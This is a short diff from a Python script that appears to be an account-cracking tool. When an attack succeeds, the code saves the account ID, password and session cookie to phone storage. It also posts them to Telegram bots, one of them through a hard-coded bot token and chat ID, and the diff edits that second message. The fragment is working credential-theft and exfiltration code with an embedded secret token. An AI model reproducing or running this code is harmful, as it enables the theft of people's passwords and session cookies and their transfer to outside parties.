@@ -1615,7 +1615,7 @@ def m7(ids,pwv):
                         statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                        stasok = (f" {usragnt} ")
+                        stasok = (f" {war} ")
                         requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                         oks.append(cid)
                         break
